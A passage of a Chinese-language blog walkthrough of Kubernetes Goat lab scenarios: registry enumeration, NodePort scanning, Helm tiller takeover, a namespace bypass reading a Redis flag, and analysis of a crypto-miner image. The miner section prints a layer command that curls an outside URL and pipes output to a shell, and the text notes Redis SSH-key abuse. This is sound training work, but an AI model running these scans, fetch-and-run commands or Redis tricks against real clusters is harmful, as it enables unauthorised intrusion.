plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@k8s-master:~/kubernetes-goat# kubectl delete -f ./scenarios/kube-bench-security/node-job.yaml </span><br><span class="line">job.batch &quot;kube-bench-node&quot; deleted</span><br><span class="line">root@k8s-master:~/kubernetes-goat# kubectl apply -f ./scenarios/kube-bench-security/node-job.yaml </span><br><span class="line">job.batch/kube-bench-node created</span><br></pre></td></tr></table></figure><p>便可以了，所以还是得用最新的配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@k8s-master:~/kubernetes-goat# kubectl get pods</span><br><span class="line">NAME                                               READY   STATUS      RESTARTS   AGE</span><br><span class="line">batch-check-job-mrd2q                              0/1     Completed   0          4d6h</span><br><span class="line">build-code-deployment-99d5f65db-hxllz              1/1     Running     0          4d6h</span><br><span class="line">docker-bench-security-dvlgz                        1/1     Running     0          63m</span><br><span class="line">health-check-deployment-66c59d7f6f-qf5b7           1/1     Running     0          4d6h</span><br><span class="line">hidden-in-layers-lbwbn                             1/1     Running     0          4d6h</span><br><span class="line">internal-proxy-deployment-5d99cbbdf7-wqmgr         2/2     Running     0          4d1h</span><br><span class="line">kube-bench-node-8xndd                              0/1     Completed   0          68s</span><br><span class="line">kubernetes-goat-home-deployment-757f96b7cd-tq5zh   1/1     Running     0          4d6h</span><br><span class="line">metadata-db-77987b74b-2tqjr                        1/1     Running     0          4d6h</span><br><span class="line">poor-registry-deployment-6746b95974-j9xrw          1/1     Running     0          4d6h</span><br><span class="line">system-monitor-deployment-594c89b48f-97rs9         1/1     Running     0          4d6h</span><br></pre></td></tr></table></figure><p>可以通过logs查看审计的log</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs -f kube-bench-XXX-xxxxx</span><br></pre></td></tr></table></figure><h1 id="攻击私有仓库-Attacking-private-registry"><a href="#攻击私有仓库-Attacking-private-registry" class="headerlink" title="攻击私有仓库(Attacking private registry)"></a>攻击私有仓库(Attacking private registry)</h1><p>通过访问<code>/v2/_catalog</code>可以获取所有repositories</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://192.168.2.174:1235/v2/_catalog</span><br><span class="line">&#123;&quot;repositories&quot;:[&quot;madhuakula/k8s-goat-alpine&quot;,&quot;madhuakula/k8s-goat-users-repo&quot;]&#125;</span><br></pre></td></tr></table></figure><p>获取第二个镜像的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://192.168.2.174:1235/v2/madhuakula/k8s-goat-users-repo/manifests/latest</span><br><span class="line">&#123;</span><br><span class="line">   &quot;schemaVersion&quot;: 1,</span><br><span class="line">   &quot;name&quot;: &quot;madhuakula/k8s-goat-users-repo&quot;,</span><br><span class="line">   &quot;tag&quot;: &quot;latest&quot;,</span><br><span class="line">   &quot;architecture&quot;: &quot;amd64&quot;,</span><br><span class="line">   &quot;fsLayers&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">         &quot;blobSum&quot;: &quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         &quot;blobSum&quot;: &quot;sha256:536ef5475913f0235984eb7642226a99ff4a91fa474317faa45753e48e631bd0&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>从中有环境变量信息</p><p><img src="http://pic.giantbranch.cn/pic/1655721670803.png" alt></p><h1 id="NodePort暴露服务"><a href="#NodePort暴露服务" class="headerlink" title="NodePort暴露服务"></a>NodePort暴露服务</h1><p>NodePort在集群中的主机节点上为Service提供一个代理端口，以允许从主机网络上对Service进行访问。</p><p>这里是本地搭建的，没有公网ip，所以也就没有外部IP——EXTERNAL-IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get nodes -o wide</span><br><span class="line">NAME         STATUS   ROLES                  AGE     VERSION    INTERNAL-IP     EXTERNAL-IP   OS-IMAGE             KERNEL-VERSION     CONTAINER-RUNTIME</span><br><span class="line">k8s-master   Ready    control-plane,master   4d23h   v1.21.13   192.168.2.174   &lt;none&gt;        Ubuntu 20.04.2 LTS   5.4.0-72-generic   docker://20.10.16</span><br><span class="line">nsfocus      Ready    &lt;none&gt;                 4d23h   v1.21.13   192.168.2.172   &lt;none&gt;        Ubuntu 20.04.2 LTS   5.4.0-72-generic   docker://20.10.16</span><br></pre></td></tr></table></figure><p>默认情况下，NodePort的端口范围是 30000-32767，使用nmap扫描，这里就以内网ip为例了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -T4 -p 30000-32767 192.168.2.172</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-20 18:57 CST</span><br><span class="line">Nmap scan report for 192.168.2.172</span><br><span class="line">Host is up (0.0055s latency).</span><br><span class="line">Not shown: 2767 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">30003/tcp open  amicon-fpsu-ra</span><br><span class="line">MAC Address: 00:50:56:A2:18:00 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds</span><br></pre></td></tr></table></figure><p>可以看到是30003端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://192.168.2.172:30003/</span><br><span class="line">&#123;&quot;info&quot;: &quot;Refer to internal http://metadata-db for more information&quot;&#125;</span><br></pre></td></tr></table></figure><h1 id="Helm-v2-tiller-to-PwN-the-cluster-已弃用"><a href="#Helm-v2-tiller-to-PwN-the-cluster-已弃用" class="headerlink" title="Helm v2 tiller to PwN the cluster[已弃用]"></a>Helm v2 tiller to PwN the cluster[已弃用]</h1><p>这已经从 Kubernetes Goat 启弃用，但是还可以看一下</p><p>Helm 是 Kubernetes 部署和管理应用程序的包管理器，默认配置和设置是不安全的，如果攻击者可以访问任何一个 pod 并且没有网络安全策略 (NSP)，攻击者可以获得完整的集群访问权限和接管集群管理员权限。</p><p>启动环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run --rm --restart=Never -it --image=madhuakula/k8s-goat-helm-tiller -- bash</span><br></pre></td></tr></table></figure><p>默认情况下，helm 版本 2 有一个 tiller 组件，它具有完整的集群管理 RBAC 权限</p><p>这个暂时有点问题，不能实践，就是默认不允许执行<code>kubectl get secrets -n kube-system</code>，通过 helm 和 tiller 服务的帮助下部署pwnchart，它将授予所有默认服务帐户 cluster-admin 访问权限，从而可以执行<code>kubectl get secrets -n kube-system</code></p><h1 id="分析挖矿容器-Analysing-crypto-miner-container"><a href="#分析挖矿容器-Analysing-crypto-miner-container" class="headerlink" title="分析挖矿容器(Analysing crypto miner container)"></a>分析挖矿容器(Analysing crypto miner container)</h1><p>一般我们从 Docker Hub 等公共容器仓库下载镜像，黑客可能通过上传运行挖矿程序的镜像到仓库来让用户帮忙挖矿。</p><p>先查看 Kubernetes 集群中的 jobs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get jobs -A</span><br><span class="line">NAMESPACE   NAME               COMPLETIONS   DURATION   AGE</span><br><span class="line">default     batch-check-job    1/1           36s        5d5h</span><br><span class="line">default     hidden-in-layers   0/1           5d5h       5d5h</span><br><span class="line">default     kube-bench-node    1/1           29s        22h</span><br></pre></td></tr></table></figure><p>kube-bench-node是之前node的基线检查</p><p>获取job的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl describe job batch-check-job</span><br><span class="line">Name:           batch-check-job</span><br><span class="line">Namespace:      default</span><br><span class="line">Selector:       controller-uid=2ef52301-70c7-48f1-8df7-9319674f2ca7</span><br><span class="line">Labels:         controller-uid=2ef52301-70c7-48f1-8df7-9319674f2ca7</span><br><span class="line">                job-name=batch-check-job</span><br><span class="line">Annotations:    &lt;none&gt;</span><br><span class="line">Parallelism:    1</span><br><span class="line">Completions:    1</span><br><span class="line">Start Time:     Thu, 16 Jun 2022 10:53:35 +0800</span><br><span class="line">Completed At:   Thu, 16 Jun 2022 10:54:11 +0800</span><br><span class="line">Duration:       36s</span><br><span class="line">Pods Statuses:  0 Running / 1 Succeeded / 0 Failed</span><br><span class="line">Pod Template:</span><br><span class="line">  Labels:  controller-uid=2ef52301-70c7-48f1-8df7-9319674f2ca7</span><br><span class="line">           job-name=batch-check-job</span><br><span class="line">  Containers:</span><br><span class="line">   batch-check:</span><br><span class="line">    Image:        madhuakula/k8s-goat-batch-check</span><br><span class="line">    Port:         &lt;none&gt;</span><br><span class="line">    Host Port:    &lt;none&gt;</span><br><span class="line">    Environment:  &lt;none&gt;</span><br><span class="line">    Mounts:       &lt;none&gt;</span><br><span class="line">  Volumes:        &lt;none&gt;</span><br><span class="line">Events:           &lt;none&gt;</span><br></pre></td></tr></table></figure><p>获取job对应的pods</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get pods --namespace default -l &quot;job-name=batch-check-job&quot;</span><br><span class="line">NAME                    READY   STATUS      RESTARTS   AGE</span><br><span class="line">batch-check-job-mrd2q   0/1     Completed   0          5d5h</span><br></pre></td></tr></table></figure><p>以yaml格式输出pod的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get pod batch-check-job-mrd2q -o yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  creationTimestamp: &quot;2022-06-16T02:53:35Z&quot;</span><br><span class="line">  generateName: batch-check-job-</span><br><span class="line">  labels:</span><br><span class="line">    controller-uid: 2ef52301-70c7-48f1-8df7-9319674f2ca7</span><br><span class="line">    job-name: batch-check-job</span><br><span class="line">  name: batch-check-job-mrd2q</span><br><span class="line">  namespace: default</span><br><span class="line">  ownerReferences:</span><br><span class="line">  - apiVersion: batch/v1</span><br><span class="line">    blockOwnerDeletion: true</span><br><span class="line">    controller: true</span><br><span class="line">    kind: Job</span><br><span class="line">    name: batch-check-job</span><br><span class="line">    uid: 2ef52301-70c7-48f1-8df7-9319674f2ca7</span><br><span class="line">  resourceVersion: &quot;72916&quot;</span><br><span class="line">  uid: 27657ad4-4fa9-48d0-bdd8-c131137ac3d2</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - image: madhuakula/k8s-goat-batch-check</span><br><span class="line">    imagePullPolicy: Always</span><br><span class="line">    name: batch-check</span><br><span class="line">    resources: &#123;&#125;</span><br><span class="line">    terminationMessagePath: /dev/termination-log</span><br><span class="line">    terminationMessagePolicy: File</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount</span><br><span class="line">      name: kube-api-access-pdfwk</span><br><span class="line">      readOnly: true</span><br><span class="line">  dnsPolicy: ClusterFirst</span><br><span class="line">  enableServiceLinks: true</span><br><span class="line">  nodeName: nsfocus</span><br><span class="line">  preemptionPolicy: PreemptLowerPriority</span><br><span class="line">  priority: 0</span><br><span class="line">  restartPolicy: Never</span><br><span class="line">  schedulerName: default-scheduler</span><br><span class="line">  securityContext: &#123;&#125;</span><br><span class="line">  serviceAccount: default</span><br><span class="line">  serviceAccountName: default</span><br><span class="line">  terminationGracePeriodSeconds: 30</span><br><span class="line">  tolerations:</span><br><span class="line">  - effect: NoExecute</span><br><span class="line">    key: node.kubernetes.io/not-ready</span><br><span class="line">    operator: Exists</span><br><span class="line">    tolerationSeconds: 300</span><br><span class="line">  - effect: NoExecute</span><br><span class="line">    key: node.kubernetes.io/unreachable</span><br><span class="line">    operator: Exists</span><br><span class="line">    tolerationSeconds: 300</span><br><span class="line">  volumes:</span><br><span class="line">  - name: kube-api-access-pdfwk</span><br><span class="line">    projected:</span><br><span class="line">      defaultMode: 420</span><br><span class="line">      sources:</span><br><span class="line">      - serviceAccountToken:</span><br><span class="line">          expirationSeconds: 3607</span><br><span class="line">          path: token</span><br><span class="line">      - configMap:</span><br><span class="line">          items:</span><br><span class="line">          - key: ca.crt</span><br><span class="line">            path: ca.crt</span><br><span class="line">          name: kube-root-ca.crt</span><br><span class="line">      - downwardAPI:</span><br><span class="line">          items:</span><br><span class="line">          - fieldRef:</span><br><span class="line">              apiVersion: v1</span><br><span class="line">              fieldPath: metadata.namespace</span><br><span class="line">            path: namespace</span><br><span class="line">status:</span><br><span class="line">  conditions:</span><br><span class="line">  - lastProbeTime: null</span><br><span class="line">    lastTransitionTime: &quot;2022-06-16T02:53:35Z&quot;</span><br><span class="line">    reason: PodCompleted</span><br><span class="line">    status: &quot;True&quot;</span><br><span class="line">    type: Initialized</span><br><span class="line">  - lastProbeTime: null</span><br><span class="line">    lastTransitionTime: &quot;2022-06-16T02:53:35Z&quot;</span><br><span class="line">    reason: PodCompleted</span><br><span class="line">    status: &quot;False&quot;</span><br><span class="line">    type: Ready</span><br><span class="line">  - lastProbeTime: null</span><br><span class="line">    lastTransitionTime: &quot;2022-06-16T02:53:35Z&quot;</span><br><span class="line">    reason: PodCompleted</span><br><span class="line">    status: &quot;False&quot;</span><br><span class="line">    type: ContainersReady</span><br><span class="line">  - lastProbeTime: null</span><br><span class="line">    lastTransitionTime: &quot;2022-06-16T02:53:35Z&quot;</span><br><span class="line">    status: &quot;True&quot;</span><br><span class="line">    type: PodScheduled</span><br><span class="line">  containerStatuses:</span><br><span class="line">  - containerID: docker://3c724beda2e350f66c3e1845535a2b62f03f3678070ac6d290c39ee7462feb1f</span><br><span class="line">    image: madhuakula/k8s-goat-batch-check:latest</span><br><span class="line">    imageID: docker-pullable://madhuakula/k8s-goat-batch-check@sha256:5be381d47c086a0b74bbcdefa5f3ba0ebb78c8acbd2c07005346b5ff687658ef</span><br><span class="line">    lastState: &#123;&#125;</span><br><span class="line">    name: batch-check</span><br><span class="line">    ready: false</span><br><span class="line">    restartCount: 0</span><br><span class="line">    started: false</span><br><span class="line">    state:</span><br><span class="line">      terminated:</span><br><span class="line">        containerID: docker://3c724beda2e350f66c3e1845535a2b62f03f3678070ac6d290c39ee7462feb1f</span><br><span class="line">        exitCode: 0</span><br><span class="line">        finishedAt: &quot;2022-06-16T02:54:11Z&quot;</span><br><span class="line">        reason: Completed</span><br><span class="line">        startedAt: &quot;2022-06-16T02:54:11Z&quot;</span><br><span class="line">  hostIP: 192.168.2.172</span><br><span class="line">  phase: Succeeded</span><br><span class="line">  podIP: 10.244.1.4</span><br><span class="line">  podIPs:</span><br><span class="line">  - ip: 10.244.1.4</span><br><span class="line">  qosClass: BestEffort</span><br><span class="line">  startTime: &quot;2022-06-16T02:53:35Z&quot;</span><br></pre></td></tr></table></figure><p>batch-check-job使用的是<code>madhuakula/k8s-goat-batch-check</code>镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get pod batch-check-job-mrd2q -o yaml | grep image</span><br><span class="line">  - image: madhuakula/k8s-goat-batch-check</span><br><span class="line">    imagePullPolicy: Always</span><br><span class="line">    image: madhuakula/k8s-goat-batch-check:latest</span><br><span class="line">    imageID: docker-pullable://madhuakula/k8s-goat-batch-check@sha256:5be381d47c086a0b74bbcdefa5f3ba0ebb78c8acbd2c07005346b5ff687658ef</span><br></pre></td></tr></table></figure><p>我们可以通过<code>docker history</code>查看image每一层所执行的命令，<code>--no-trunc</code>是不要截断输出<br>(下面这个需要在node执行，因为只有在node有这个镜像)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker history --no-trunc madhuakula/k8s-goat-batch-check</span><br><span class="line">IMAGE                                                                     CREATED        CREATED BY                                                                                                                                                                                                                                                                                 SIZE      COMMENT</span><br><span class="line">sha256:cb43bcb572b74468336c6854282c538e9ac7f2efc294aa3e49ce34fab7a275c7   5 weeks ago    CMD [&quot;ps&quot; &quot;auxx&quot;]                                                                                                                                                                                                                                                                          0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;                                                                 5 weeks ago    RUN /bin/sh -c apk add --no-cache htop curl ca-certificates    &amp;&amp; echo &quot;curl -sSL https://madhuakula.com/kubernetes-goat/k8s-goat-a5e0a28fa75bf429123943abedb065d1 &amp;&amp; echo &apos;id&apos; | sh &quot; &gt; /usr/bin/system-startup     &amp;&amp; chmod +x /usr/bin/system-startup     &amp;&amp; rm -rf /tmp/* # buildkit   2.96MB    buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;                                                                 5 weeks ago    LABEL MAINTAINER=Madhu Akula INFO=Kubernetes Goat                                                                                                                                                                                                                                          0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;                                                                 2 months ago   /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot;]                                                                                                                                                                                                                                                         0B        </span><br><span class="line">&lt;missing&gt;                                                                 2 months ago   /bin/sh -c #(nop) ADD file:5d673d25da3a14ce1f6cf66e4c7fd4f4b85a3759a9d93efb3fd9ff852b5b56e4 in /                                                                                                                                                                                           5.57MB</span><br></pre></td></tr></table></figure><p>可以看到执行了这个可疑的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -c apk add --no-cache htop curl ca-certificates    &amp;&amp; echo &quot;curl -sSL https://madhuakula.com/kubernetes-goat/k8s-goat-a5e0a28fa75bf429123943abedb065d1 &amp;&amp; echo &apos;id&apos; | sh &quot; &gt; /usr/bin/system-startup     &amp;&amp; chmod +x /usr/bin/system-startup     &amp;&amp; rm -rf /tmp/*</span><br></pre></td></tr></table></figure><h1 id="Kubernetes-命名空间绕过-Kubernetes-namespaces-bypass"><a href="#Kubernetes-命名空间绕过-Kubernetes-namespaces-bypass" class="headerlink" title="Kubernetes 命名空间绕过(Kubernetes namespaces bypass)"></a>Kubernetes 命名空间绕过(Kubernetes namespaces bypass)</h1><p> Kubernetes 中有不同的命名空间并且资源被部署和管理时，它们是安全的并且无法相互访问。</p><p> 默认情况下，Kubernetes 使用平面网络架构，这意味着集群中的任何 pod/服务都可以与其他人通信。</p><p> 默认情况下，集群内的命名空间没有任何网络安全限制。命名空间中的任何人都可以与其他命名空间通信。</p><p>启动环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run --rm -it hacker-container --image=madhuakula/hacker-container -- sh</span><br></pre></td></tr></table></figure><p>先编辑<code>vi /etc/zmap/blacklist.conf</code>，注释里面的<code>10.0.0.0/8</code>这一行，不然不能扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zmap -p 6379 10.0.0.0/8 -o results.csv</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">~ # ifconfig </span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 76:20:B2:1E:01:E8  </span><br><span class="line">          inet addr:10.244.1.31  Bcast:10.244.1.255  Mask:255.255.255.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1</span><br><span class="line">          RX packets:2583424 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:22995250 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:181718935 (173.2 MiB)  TX bytes:1229657656 (1.1 GiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">~ # cat results.csv | grep 10.244</span><br><span class="line">10.244.1.5</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~ # redis-cli -h 10.244.1.5</span><br><span class="line">10.244.1.5:6379&gt; KEYS *</span><br><span class="line">1) &quot;SECRETSTUFF&quot;</span><br><span class="line">10.244.1.5:6379&gt; GET SECRETSTUFF</span><br><span class="line">&quot;k8s-goat-a5a3e446faafa9d0514b3ff396ab8a40&quot;</span><br></pre></td></tr></table></figure><p>这其实在现实中就是redis未授权访问，Redis服务器假如以root身份运行，黑客就能够给root账户写入SSH公钥文件，然后直接通过SSH登录目标受害的服务器</p><h1 id="获取环境信息"><a href="#获取环境信息" class="headerlink" title="获取环境信息"></a>获取环境信息</h1><p>通过/proc/self/cgroup 文件可以获取到docker容器的id</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@nsfocus:/home# cat /proc/self/cgroup  </span><br><span class="line">12:blkio:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">11:pids:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">10:rdma:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">9:devices:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">8:freezer:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">7:perf_event:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">6:cpuset:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">5:hugetlb:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">4:memory:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">3:net_cls,net_prio:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">2:cpu,cpuacct:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">1:name=systemd:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span 